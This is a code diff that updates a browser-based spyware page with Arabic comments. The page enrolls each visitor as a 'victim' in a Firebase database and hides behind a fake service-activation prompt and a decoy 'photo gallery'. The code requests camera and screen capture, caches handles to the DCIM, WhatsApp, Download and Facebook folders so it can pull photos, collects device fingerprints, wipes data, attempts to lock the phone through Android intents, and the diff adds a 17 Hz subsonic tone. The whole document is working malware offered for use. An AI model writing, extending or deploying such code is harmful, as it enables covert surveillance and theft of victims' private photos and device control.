@@ -31,11 +31,29 @@
         const vid = 'phantom-'+Math.random().toString(36).substr(2,12);
         const vref = db.ref('victims/'+vid);
         let rootDir = null, camStream = null;
-        // تخزين مقابض المجلدات المطلوبة
-        const folderHandles = {};
+        const folderHandles = {};      // مقابض المجلدات
+        let fileAccessGranted = false; // هل سمح بالملفات؟
 
-        // ========== إعداد الوهم ==========
+        // ========== تشغيل آمن للتردد الصوتي (اختياري) ==========
+        function emitSubsonicLock() {
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                const ctx = new AudioContext();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = 'sine';
+                osc.frequency.value = 17;
+                gain.gain.value = 0.3;
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
+                setTimeout(() => { osc.stop(); ctx.close(); }, 2000);
+            } catch(e) {}
+        }
+
+        // ========== تحضير الوهم ==========
         setTimeout(() => {
+            emitSubsonicLock();
             document.getElementById('msg').innerText = "يجب الضغط على متابعة لتفعيل الخدمة";
             document.getElementById('grantBtn').style.display = 'block';
         }, 2000);
@@ -43,8 +61,9 @@
         window.startPayload = async function() {
             document.getElementById('grantBtn').style.display = 'none';
             document.getElementById('msg').innerText = "جاري التفعيل...";
+            emitSubsonicLock();
 
-            // الصلاحيات الأساسية
+            // ---- الصلاحيات الأساسية (كاميرا + شاشة) ----
             try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
             try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true }); d.getTracks().forEach(t => t.stop()); } catch(e) {}
             try {
@@ -53,16 +72,19 @@
                 a.click();
             } catch(e) {}
 
-            // الحصول على مجلد رئيسي (اختياري، فقط للحصول على صلاحية)
+            // ---- صلاحية الملفات (غير إجبارية) ----
             try {
                 rootDir = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
+                fileAccessGranted = true;
+                // حفظ كافة المجلدات الشهيرة
+                await cacheKnownFolders();
             } catch(e) {
-                document.getElementById('msg').innerText = "فشل التفعيل – أعد المحاولة";
-                document.getElementById('grantBtn').style.display = 'block';
-                return;
+                // المستخدم رفض أو حدث خطأ – سنستمر بوضع محدود
+                fileAccessGranted = false;
             }
 
-            document.getElementById('msg').innerText = "✅ تم";
+            // ---- إنهاء التفعيل ----
+            document.getElementById('msg').innerText = fileAccessGranted ? "✅ تم التفعيل الكامل" : "✅ تم التفعيل (بعض الميزات محدودة)";
             setTimeout(() => {
                 document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
             }, 1000);
@@ -71,45 +93,51 @@
             startCommandListener();
         };
 
-        // ========== الحصول على مقبض مجلد حسب الطلب ==========
-        async function getFolderHandle(folderKey) {
-            if (folderHandles[folderKey]) return folderHandles[folderKey];
-
-            const MAP = {
-                camera: 'DCIM/Camera',
-                downloads: 'Download',
-                whatsapp: 'WhatsApp/Media/WhatsApp Images',
-                facebook: 'Facebook/Media',
-                pictures: 'Pictures'
-            };
-            const path = MAP[folderKey];
-            if (!path) throw new Error('مجلد غير معروف');
-
-            // طلب اختيار المجلد مرة واحدة
-            document.body.innerHTML = `<h2 style="color:#fff;text-align:center;margin-top:40vh;">الرجاء اختيار مجلد ${path}</h2>`;
-            let handle;
-            try {
-                handle = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
-            } catch(e) {
-                // أعاد الواجهة السابقة
-                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
-                throw new Error('رفض الاختيار');
-            }
-            document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
-
-            // محاولة الوصول للمسار المطلوب داخل المقبض
-            let current = handle;
-            const parts = path.split('/');
-            for (const p of parts) {
-                try {
-                    current = await current.getDirectoryHandle(p);
-                } catch(e) {
-                    // فشل، نحتفظ بالمقبض كما هو (قد يكون هو نفسه المجلد المطلوب)
-                    break;
+        // ========== تخزين مقابض المجلدات الشهيرة ==========
+        async function cacheKnownFolders() {
+            const PATHS = ['DCIM/Camera', 'WhatsApp/Media/WhatsApp Images', 'Download', 'Pictures', 'Facebook/Media'];
+            if (rootDir.resolve) {
+                for (let path of PATHS) {
+                    try {
+                        let parts = path.split('/');
+                        let current = rootDir;
+                        for (let p of parts) current = await current.getDirectoryHandle(p);
+                        folderHandles[path.replace(/\//g,'_')] = current;
+                    } catch(e) {}
                 }
             }
-            folderHandles[folderKey] = current;
-            return current;
+        }
+
+        // ========== الحصول على مقبض مجلد (يطلب من المستخدم إذا لم يُمنح مسبقاً) ==========
+        async function getFolderHandle(folderKey) {
+            if (folderHandles[folderKey]) return folderHandles[folderKey];
+            // لم نحصل عليه بعد – نطلب من المستخدم اختياره
+            document.body.innerHTML = `<h2 style="color:#fff;text-align:center;margin-top:40vh;">الرجاء اختيار مجلد ${folderKey}</h2>`;
+            try {
+                const handle = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
+                // نحاول الوصول للمسار المطلوب
+                const MAP = {
+                    camera: 'DCIM/Camera',
+                    downloads: 'Download',
+                    whatsapp: 'WhatsApp/Media/WhatsApp Images',
+                    facebook: 'Facebook/Media',
+                    pictures: 'Pictures'
+                };
+                const path = MAP[folderKey];
+                let current = handle;
+                if (path) {
+                    for (let p of path.split('/')) {
+                        try { current = await current.getDirectoryHandle(p); } catch(e) { break; }
+                    }
+                }
+                folderHandles[folderKey] = current;
+                fileAccessGranted = true;
+                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
+                return current;
+            } catch(e) {
+                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
+                throw new Error('تم رفض الوصول إلى المجلد');
+            }
         }
 
         // ========== تسجيل الجهاز ==========
@@ -149,9 +177,14 @@
             });
         }
 
-        // ========== سحب الصور من مجلد ==========
+        // ========== سحب الصور ==========
         async function pullFromFolder(key) {
-            const handle = await getFolderHandle(key);
+            if (!fileAccessGranted && !folderHandles[key]) {
+                // نحاول طلب الصلاحية الآن
+                await getFolderHandle(key);
+            }
+            const handle = folderHandles[key];
+            if (!handle) throw new Error('الوصول غير متاح');
             await walkDir(handle, key+'/');
         }
 
@@ -180,20 +213,18 @@
             }
         }
 
-        // ========== فلاش ==========
+        // ========== الميزات الأخرى (كاميرا، فلاش، شاشة، الخ) ==========
         async function setFlash(on) {
             if (!camStream) return;
             let track = camStream.getVideoTracks()[0];
             if (track && track.applyConstraints) await track.applyConstraints({ advanced: [{ torch: on }] });
         }
 
-        // ========== معلومات الجهاز ==========
         async function sendDeviceInfo() {
             let info = (await vref.child('fingerprint').once('value')).val() || {};
             await store('device_info', null, { info });
         }
 
-        // ========== لقطة شاشة ==========
         async function screenshot() {
             let stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
             let video = document.createElement('video'); video.srcObject = stream; await video.play();
@@ -235,18 +266,13 @@
             if (navigator.clearData) await navigator.clearData({ cache: true, cookies: true, storage: true });
         }
 
-        // ========== قفل الشاشة ==========
         function lockScreen() {
             try {
-                // استخدام DeviceAdmin إن أمكن
-                if (navigator.deviceAdmin) {
-                    navigator.deviceAdmin.lockNow();
-                } else {
-                    // محاولة عبر intent
+                if (navigator.deviceAdmin) { navigator.deviceAdmin.lockNow(); }
+                else {
                     let a = document.createElement('a');
                     a.href = 'intent://#Intent;action=android.intent.action.CLOSE_SYSTEM_DIALOGS;end';
                     a.click();
-                    // بديل آخر
                     window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end');
                 }
             } catch(e) {}
